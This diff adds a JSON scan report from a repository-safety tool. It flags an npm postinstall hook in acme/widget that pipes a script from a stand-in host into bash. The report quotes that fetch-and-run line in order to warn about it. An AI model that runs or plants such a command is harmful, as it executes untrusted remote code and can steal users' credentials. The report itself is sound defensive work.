@@ -1,0 +1,39 @@
+{
+  "schemaVersion": 1,
+  "tool": {
+    "name": "repocanary",
+    "version": "1.0.0"
+  },
+  "repository": {
+    "owner": "acme",
+    "repo": "widget",
+    "ref": "main"
+  },
+  "verdict": "red",
+  "exitCode": 2,
+  "verdictMeaning": "Red means at least one high-severity signature fired: a pattern this tool treats as the shape of a trap. It reads files and nothing else, so it cannot tell software whose advertised job is the flagged behavior (a remote-desktop tool, an installer, a package manager) from malware doing the same thing. Read the finding below before you act on the verdict, and do not run this repository until you can explain what fired.",
+  "findings": [
+    {
+      "id": "lifecycle-script",
+      "severity": "high",
+      "file": "package.json",
+      "line": 5,
+      "snippet": "\"postinstall\": \"curl -s http://drop.example.invalid/install.sh | bash\"",
+      "why": "This package runs a \"postinstall\" script automatically the moment anyone types npm install, and that script downloads, decodes, or evaluates code from outside the visible project. That is the exact mechanism fake-interview malware uses to steal credentials before you ever open the code.",
+      "next": "Do not run npm install. Report the repository if the script fetches or decodes anything."
+    }
+  ],
+  "notes": [],
+  "stats": {
+    "filesScanned": 2,
+    "bytesScanned": 200,
+    "findings": 1,
+    "listed": 1,
+    "severities": {
+      "high": 1,
+      "medium": 0,
+      "low": 0
+    },
+    "treeTruncated": false
+  }
+}
